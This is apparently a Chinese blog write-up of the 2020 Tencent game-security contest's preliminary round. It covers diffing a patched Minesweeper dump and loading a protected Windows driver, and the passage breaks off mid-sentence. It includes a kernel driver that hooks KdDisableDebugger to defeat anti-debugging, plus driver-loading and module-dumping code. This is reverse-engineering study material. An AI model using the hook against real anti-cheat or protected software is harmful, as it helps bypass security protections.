    <updated>2024-04-09T05:23:09.908Z</updated>
    
    <content type="html"><![CDATA[<p>遵照着师傅的建议，来复盘一下 2020 年的比赛。</p><span id="more"></span><h2 id="初赛"><a href="#初赛" class="headerlink" title="初赛"></a>初赛</h2><h3 id="题目说明"><a href="#题目说明" class="headerlink" title="题目说明"></a>题目说明</h3><p>初赛共分为ring3和ring0两道题，每题5分，累计积分，即满分为10分。</p><p>初赛ring3题目：（本题共5分）</p><p>winmine.exe是一个扫雷游戏程序，winmine.dmp是该程序的一份进程dump, 在这份dump中，winmine.exe的内存映像有指令被篡改，篡改实现了外挂功能。</p><p>1, 请找出dump中，winmine.exe的内存映像中2处被篡改实现外挂功能的指令（被篡改指令的偏移、篡改前后的指令分别是什么），并分析这些指令篡改所实现的外挂功能是什么。（4分）</p><p>2, 请提供文档，详细描述解题过程，如涉及编写程序，必须提供源代码。（1分）</p><p>初赛ring0题目：（本题共5分）</p><p>DriverDemo.sys是一个驱动程序，它内置了一些限制。</p><p>1, 不能篡改该文件，尝试使驱动成功加载。（3分）</p><p>2, 该驱动程序成功加载后，突破它的限制，但不允许patch文件或内存，使它成功打印出（用dbgview可接受）调试信息”hello world!”.（2分）</p><p>请以文档方式，详细描述解题过程，如涉及编写程序，必须提供源代码。</p><p>驱动未签名，需要设置Windows 10高级启动选项，禁用驱动程序强制签名后方可答题，支持使用虚拟机。</p><h3 id="Ring3"><a href="#Ring3" class="headerlink" title="Ring3"></a>Ring3</h3><p>提供了 dump 文件而且提供了正常的游戏文件，那么马上可以想到去提取内存中的指令去 <code>diff</code>，这里直接 <code>windbg preview</code> 打开然后使用命令 <code>.writemem D:\winmine.exe 0x1000000 0x1020000-1</code></p><img src="/2024/03/30/tencent-race-2020-pre/1.png" class=""><p>为了方便，可以先用 CyberChef 把提取的内存文件转为 hex 然后 <code>split by \n</code>。</p><p>同样正常打开 winmine 再去附加 dump，同样的方法得到文件，然后使用一个脚本去 diff</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">f1=<span class="built_in">open</span>(<span class="string">&quot;download1.dat&quot;</span>,<span class="string">&quot;r&quot;</span>).read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">f2=<span class="built_in">open</span>(<span class="string">&quot;download2.dat&quot;</span>,<span class="string">&quot;r&quot;</span>).read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">l=<span class="built_in">len</span>(f1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">    <span class="keyword">if</span> f1[i]!=f2[i]:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Memory Addr: <span class="subst">&#123;<span class="built_in">hex</span>(i)&#125;</span> ErrorDump:<span class="subst">&#123;f1[i]&#125;</span>,CorrectDump:<span class="subst">&#123;f2[i]&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>一般这种修改喜欢去动跳转，所以着重找 <code>E8 E9 EB</code> 这些无条件跳转指令。</p><img src="/2024/03/30/tencent-race-2020-pre/2.png" class=""><p>在外挂的 dump 中发现一个 <code>EB</code> jmp 指令，于是直接用 x32dbg 去启动找到对应的位置。</p><p>按照它字节码的形式，该命令应该被改为 <code>jmp 0x10035b0</code></p><img src="/2024/03/30/tencent-race-2020-pre/3.png" class=""><p>而进行了修改之后，发现点雷不会爆</p><img src="/2024/03/30/tencent-race-2020-pre/4.png" class=""><p>第一点就分析出来了</p><p><code>winmine.exe+0x3591</code>，修改前：<code>PUSH 0</code> 修改后：<code>jmp 0x10035B0</code>，外挂功能是点雷不会爆炸。</p><p>后面本来没什么头绪了，意外看到有一连串的 90。</p><img src="/2024/03/30/tencent-race-2020-pre/5.png" class=""><p>于是尝试修改，发现时间暂停了，这里应该是计数器。</p><p><code>winmine.exe+0x2FF5</code>，修改前：<code>inc dword ptr ds:[0x0100579C]</code> 修改后：<code>NOP*6</code>，外挂功能是时间暂停。</p><h3 id="Ring0"><a href="#Ring0" class="headerlink" title="Ring0"></a>Ring0</h3><h4 id="加载驱动"><a href="#加载驱动" class="headerlink" title="加载驱动"></a>加载驱动</h4><p>直接用一个 <code>LoadDriver</code> 三环进程加载：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line">WCHAR lpMsgBuf[<span class="number">0x50</span>];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">LoadDriver</span><span class="params">(<span class="type">const</span> <span class="type">char</span> * ServeName, <span class="type">const</span> <span class="type">char</span> * DriverPath)</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> FullPath[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">GetFullPathNameA</span>(DriverPath, <span class="number">256</span>, FullPath, <span class="literal">NULL</span>);</span><br><span class="line">    SC_HANDLE hServiceMgr = <span class="literal">NULL</span>;<span class="comment">//SCM管理器的句柄</span></span><br><span class="line">    SC_HANDLE hServiceDDK = <span class="literal">NULL</span>;<span class="comment">//NT驱动程序的服务句柄</span></span><br><span class="line">    hServiceMgr = <span class="built_in">OpenSCManager</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, SC_MANAGER_ALL_ACCESS);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Open SCM handle=%p,GetLastError=%p\n&quot;</span>, hServiceMgr, <span class="built_in">GetLastError</span>());</span><br><span class="line">    hServiceDDK = <span class="built_in">CreateServiceA</span>(</span><br><span class="line">        hServiceMgr,</span><br><span class="line">        ServeName,</span><br><span class="line">        ServeName,</span><br><span class="line">        SERVICE_START,</span><br><span class="line">        SERVICE_KERNEL_DRIVER,</span><br><span class="line">        SERVICE_DEMAND_START,</span><br><span class="line">        SERVICE_ERROR_NORMAL,</span><br><span class="line">        FullPath,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">GetLastError</span>() == ERROR_SERVICE_EXISTS) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Service Already Exists\n&quot;</span>);</span><br><span class="line">        hServiceDDK = <span class="built_in">OpenServiceA</span>(hServiceMgr, ServeName, SERVICE_START);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">GetLastError</span>() != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;GetLastError=%p\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hServiceDDK=%p\n&quot;</span>, hServiceDDK);</span><br><span class="line">    <span class="type">int</span> bRet = <span class="built_in">StartService</span>(hServiceDDK, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">GetLastError</span>() == ERROR_SERVICE_ALREADY_RUNNING) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Service Already Running\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (bRet == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Service Load Fail(%d)\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Service Start Success\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">UnloadDriver</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *ServeName)</span> </span>&#123;</span><br><span class="line">    SC_HANDLE hServiceMgr = <span class="literal">NULL</span>;<span class="comment">//SCM管理器的句柄</span></span><br><span class="line">    SC_HANDLE hServiceDDK = <span class="literal">NULL</span>;<span class="comment">//NT驱动程序的服务句柄</span></span><br><span class="line">    hServiceMgr = <span class="built_in">OpenSCManager</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, SC_MANAGER_ALL_ACCESS);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Open SCM handle=%p,GetLastError=%p\n&quot;</span>, hServiceMgr, <span class="built_in">GetLastError</span>());</span><br><span class="line">    hServiceDDK = <span class="built_in">OpenServiceA</span>(hServiceMgr, ServeName, SERVICE_ALL_ACCESS);</span><br><span class="line">    <span class="keyword">if</span> (hServiceDDK) &#123;</span><br><span class="line">        <span class="type">int</span> bRet = <span class="number">0</span>;</span><br><span class="line">        SERVICE_STATUS status;</span><br><span class="line">        bRet = <span class="built_in">ControlService</span>(hServiceDDK, SERVICE_CONTROL_STOP, &amp;status);</span><br><span class="line">        <span class="keyword">if</span> (bRet) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Stop Service Success&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Can&#x27;t Stop Service&quot;</span>);</span><br><span class="line">            <span class="keyword">goto</span> GETLASTERROR;</span><br><span class="line">        &#125;</span><br><span class="line">        bRet=<span class="built_in">DeleteService</span>(hServiceDDK);</span><br><span class="line">        <span class="keyword">if</span> (bRet) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Unload Success&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Unload Fail&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">GETLASTERROR:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;GetLastError=%p\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;OpenServe Failed\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">LoadDriver</span>(<span class="string">&quot;xia0ji233&quot;</span>, <span class="string">&quot;.\\DriverDemo.sys&quot;</span>);</span><br><span class="line">    <span class="built_in">getchar</span>();</span><br><span class="line">    <span class="built_in">UnloadDriver</span>(<span class="string">&quot;xia0ji233&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行之后发现出现错误</p><img src="/2024/03/30/tencent-race-2020-pre/6.png" class=""><p>通过查找 <code>GetLastError</code> 能发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ERROR_GEN_FAILURE</span><br><span class="line">31 (0x1F)</span><br><span class="line">A device attached to the system is not functioning.</span><br></pre></td></tr></table></figure><p>驱动 VMP 了，遂放弃（bushi</p><p>但是通过参考了一些其他的文章[1]，可以得知，既然无法 PATCH 内存和文件，必定是驱动内部有一个机制来检测电脑状态是否可以加载驱动，遂打开 IDA 分析，找到关键字符串 <code>MmGetSystemRoutineAddress</code>，通过这个看看它调用了什么内核函数。参考的文章中，使用了 <a href="https://github.com/hzqst/unicorn_pe">unicorn_PE</a> 去直接脱，笔者试了一下的确是不错的方法，那么我这里就复现一下文中没提到的另一种方法，也就是带壳直接调试分析。</p><p>开机之后，断点打在这个函数，加载之后成功被断下，然后跳出来，虽然不知道在哪，但是通过上面一系列赋值吸引到了我，直接跳过去看看发现赋值了一个字符串 <code>KdDisableDebugger</code>。</p><img src="/2024/03/30/tencent-race-2020-pre/7.png" class=""><p>通过查阅 MSDN [2]得知，该函数是用于反调试的。要把这个过掉，要么 PATCH 这个函数调用，要么hook这个函数，都可以，但是 PATCH 有一定的危险就是你不知道哪个时候的 RAX 的值是多少，因此选择 hook 掉这个函数然后直接返回 <code>STATUS_DEBUGGER_INACTIVE</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ntddk.h&quot;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> kprintf(format, ...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, format, ##__VA_ARGS__)</span></span><br><span class="line">PVOID addr;</span><br><span class="line">PDRIVER_OBJECT g_Object = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> hookBYTE[] = &#123;</span><br><span class="line">    <span class="number">0xB8</span>,<span class="number">0x54</span>,<span class="number">0x03</span>,<span class="number">0x00</span>,<span class="number">0xC0</span>,</span><br><span class="line">    <span class="number">0xC3</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> hookLen = <span class="keyword">sizeof</span>(hookBYTE);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> originBYTE[<span class="number">0x50</span>];</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">MDLWriteMemory</span><span class="params">(PVOID pBaseAddress, PVOID pWriteData, SIZE_T writeDataSize)</span></span><br><span class="line">&#123;</span><br><span class="line">    PMDL pMdl = <span class="literal">NULL</span>;</span><br><span class="line">    PVOID pNewAddress = <span class="literal">NULL</span>;</span><br><span class="line">    pMdl = MmCreateMdl(<span class="literal">NULL</span>, pBaseAddress, writeDataSize);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == pMdl)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    MmBuildMdlForNonPagedPool(pMdl);</span><br><span class="line">    pNewAddress = MmMapLockedPages(pMdl, KernelMode);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == pNewAddress)</span><br><span class="line">    &#123;</span><br><span class="line">        IoFreeMdl(pMdl);</span><br><span class="line">    &#125;</span><br><span class="line">    RtlCopyMemory(pNewAddress, pWriteData, writeDataSize);</span><br><span class="line">    MmUnmapLockedPages(pNewAddress, pMdl);</span><br><span class="line">    IoFreeMdl(pMdl);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">HookHandler</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(originBYTE, addr, hookLen);</span><br><span class="line">    MDLWriteMemory(addr, hookBYTE, hookLen);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">unHookHandler</span><span class="params">()</span> &#123;</span><br><span class="line">    MDLWriteMemory(addr, originBYTE, hookLen);</span><br><span class="line">&#125;</span><br><span class="line">VOID <span class="title function_">Unload</span><span class="params">(PDRIVER_OBJECT DriverObject)</span></span><br><span class="line">&#123;</span><br><span class="line">    unHookHandler();</span><br><span class="line">    kprintf((<span class="string">&quot;BYE xia0ji233\n&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">DriverEntry</span><span class="params">(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)</span></span><br><span class="line">&#123;</span><br><span class="line">    kprintf((<span class="string">&quot;Hello xia0ji233\n&quot;</span>));</span><br><span class="line">    g_Object = DriverObject;</span><br><span class="line">    DriverObject-&gt;DriverUnload = Unload;</span><br><span class="line">    DbgBreakPoint();</span><br><span class="line">    UNICODE_STRING name;</span><br><span class="line">    RtlInitUnicodeString(&amp;name, <span class="string">L&quot;KdDisableDebugger&quot;</span>);</span><br><span class="line">    addr = MmGetSystemRoutineAddress(&amp;name);</span><br><span class="line"></span><br><span class="line">    kprintf((<span class="string">L&quot;Found Function KdDisableDebugger in address: %p\n&quot;</span>), addr);</span><br><span class="line">    HookHandler();</span><br><span class="line">    STATUS_DEBUGGER_INACTIVE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是这个被 VMP 的在调试过程中看起来逻辑也挺清晰的，因此想到能不能把内存都dump一下看看，但是由于它无法成功被加载， windbg 中也看不到它的地址，调试的时候也比较难确定范围。根据 @Qfrost 的提示，选择使用 <code>LoadImageNotify</code> 去 dump 一下此刻的驱动（暂时放弃）。</p><p>但是接着往下跟的过程中，不久后发现了另一处很有意思的调用。</p><img src="/2024/03/30/tencent-race-2020-pre/8.png" class=""><p>拉到最后，在内存视图中发现一串类似注册表的路径：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\REGISTRY\MACHINE\SOFTWARE\AppDataLow\Tencent\&#123;61B942F7-A946-4585-B624-B2C0228FFEBC&#125;</span><br></pre></td></tr></table></figure><img src="/2024/03/30/tencent-race-2020-pre/9.png" class=""><p>同时发生的变动中还有 <code>key</code> 这个数据，这里其实有点猜的成分在了。</p><p>在尝试了 <code>&#123;61B942F7-A946-4585-B624-B2C0228FFEBC&#125;</code> 作为数据的时候发现不行，但是它作为项且在里面有一个 <code>key</code> 的值为 1 时，驱动加载成功。</p><img src="/2024/03/30/tencent-race-2020-pre/10.png" class=""><p>如果不猜的话可以选择hook一下跟注册表相关的 API （<code>ZwOpenKey</code>，<code>ZwQueryValueKey</code>），看看它的调用情况，大概率也能凭自己写出来。</p><h4 id="print-hello-world"><a href="#print-hello-world" class="headerlink" title="print hello world"></a>print hello world</h4><p>既然现在能加载成功了，那么直接 dump sys，虽然已经成功加载，但是 <code>windbg</code> 中的 <code>lm</code> 还是无法列出模块的地址，因此直接写个驱动查地址用 <code>windbg</code> 去 dump，当然可以不用写，用 <code>ARK</code> 工具也能直接找到块的基址，但是为了训练一下自己还是自己写一下吧[3]：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;ntddk.h&quot;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> kprintf(format, ...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, format, ##__VA_ARGS__)</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(* func)</span><span class="params">()</span>;</span><br><span class="line">PDRIVER_OBJECT g_Object = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY</span> &#123;</span></span><br><span class="line">    LIST_ENTRY InLoadOrderLinks;</span><br><span class="line">    LIST_ENTRY InMemoryOrderLinks;</span><br><span class="line">    LIST_ENTRY InInitializationOrderLinks;</span><br><span class="line">    PVOID DllBase;</span><br><span class="line">    PVOID EntryPoint;</span><br><span class="line">    ULONG SizeOfImage;</span><br><span class="line">    UNICODE_STRING FullDllName;<span class="comment">//驱动的满路径  </span></span><br><span class="line">    UNICODE_STRING BaseDllName;<span class="comment">//不带路径的驱动名字  </span></span><br><span class="line">    ULONG Flags;</span><br><span class="line">    USHORT LoadCount;</span><br><span class="line">    USHORT TlsIndex;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        LIST_ENTRY HashLinks;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            PVOID SectionPointer;</span><br><span class="line">            ULONG CheckSum;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            ULONG TimeDateStamp;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            PVOID LoadedImports;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</span><br><span class="line"></span><br><span class="line">VOID <span class="title function_">Getaddr</span><span class="params">(PUNICODE_STRING name, UINT64* pBaseAddr,UINT64* pSize)</span></span><br><span class="line">&#123;</span><br><span class="line">    LDR_DATA_TABLE_ENTRY*TE, *Tmp;</span><br><span class="line">    TE = (LDR_DATA_TABLE_ENTRY*)g_Object-&gt;DriverSection;</span><br><span class="line">    PLIST_ENTRY LinkList;</span><br><span class="line">    ;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    LinkList = TE-&gt;InLoadOrderLinks.Flink;  </span><br><span class="line">    <span class="keyword">while</span> (LinkList != &amp;TE-&gt;InLoadOrderLinks)</span><br><span class="line">    &#123;</span><br><span class="line">        Tmp = (LDR_DATA_TABLE_ENTRY*)LinkList;</span><br><span class="line">        <span class="keyword">if</span> (RtlCompareUnicodeString(&amp;Tmp-&gt;BaseDllName, name, FALSE))</span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            kprintf((<span class="string">&quot;Found Module!\n&quot;</span>));</span><br><span class="line">            *pBaseAddr = (UINT64)(Tmp-&gt;DllBase);</span><br><span class="line">            *pSize = (UINT64)(Tmp-&gt;SizeOfImage);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        LinkList = LinkList-&gt;Flink;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">VOID <span class="title function_">Unload</span><span class="params">(PDRIVER_OBJECT DriverObject)</span></span><br><span class="line">&#123;</span><br><span class="line">    kprintf((<span class="string">&quot;BYE xia0ji233\n&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line">NTSTATUS <span class="title function_">DriverEntry</span><span class="params">(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)</span></span><br><span class="line">&#123;</span><br><span class="line">    kprintf((<span class="string">&quot;Hello xia0ji233\n&quot;</span>));</span><br><span class="line">    g_Object = DriverObject;</span><br><span class="line">    DriverObject-&gt;DriverUnload = Unload;</span><br><span class="line">    UNICODE_STRING name;</span><br><span class="line">    UINT64 Base = <span class="number">0</span>;</span><br><span class="line">    UINT64 Size=<span class="number">0</span>;</span><br><span class="line">    RtlInitUnicodeString(&amp;name, <span class="string">L&quot;DriverDemo.sys&quot;</span>);</span><br><span class="line">    Getaddr(&amp;name,&amp;Base,&amp;Size);</span><br><span class="line">    <span class="keyword">if</span> (Base) &#123;</span><br><span class="line">        kprintf((<span class="string">&quot;Base:%p Size:%x\n&quot;</span>), Base, Size);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加载驱动之后，获得基址</p><img src="/2024/03/30/tencent-race-2020-pre/11.png" class=""><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.writemem D:\dump.sys 0xFFFFF8081C4E0000 0xFFFFF8081C4E0000+0x39f000-1</span><br></pre></td></tr></table></figure><p>拖出来的 sys 还是有部分垃圾指令非常影响阅读，所以直接看字符串。</p><img src="/2024/03/30/tencent-race-2020-pre/12.png" class=""><p>发现 <code>hello world</code> 字符串，直接跟过去。</p><img src="/2024/03/30/tencent-race-2020-pre/13.png" class=""><p>分析不来，遂放弃，于是考虑从其它字符串入手。</p><img src="/2024/03/30/tencent-race-2020-pre/14.png" class=""><p>其中有一个是设备，但是 <code>\BaseNameObjects\tp2020</code> 本来没有什么头绪，后面突然想到搜一下 <code>BaseNameObjects</code> 是个什么东西，在 MSDN 